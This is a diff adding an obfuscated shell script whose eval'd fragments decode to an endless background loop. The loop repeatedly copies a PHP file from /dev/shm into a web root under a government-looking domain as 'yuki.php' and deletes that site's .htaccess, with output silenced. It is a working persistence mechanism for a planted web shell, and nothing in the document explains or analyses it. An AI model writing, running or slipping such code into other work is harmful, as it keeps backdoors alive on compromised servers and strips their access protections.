@@ -1,0 +1,3 @@
+z="
+";Vz='blic';az='rm -';Ez='/dev';xz='e &>';Jz=' /ho';nz='publ';mz='.id/';kz='urka';Dz='cp /';bz='rf /';Uz='d/pu';wz=' don';Tz='go.i';fz='nfo/';hz='emon';uz='slee';iz='es.c';Cz=' do ';lz='b.go';Oz='b/em';Mz='minf';Sz='kab.';tz='&1; ';yz='/nul';vz='p 1;';Bz='e :;';Iz='.php';gz='web/';qz='.hta';Yz='uki.';Rz='njur';Az='whil';Lz='dmko';cz='home';Gz='/con';oz='ic_h';jz='ianj';Pz='ones';dz='/adm';Nz='o/we';ABz='l';Kz='me/a';ez='komi';pz='tml/';sz='s 0>';rz='cces';Zz='php;';Xz='l/yu';Wz='_htm';Fz='/shm';Hz='tent';Qz='.cia';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$Ez$yz$ABz"
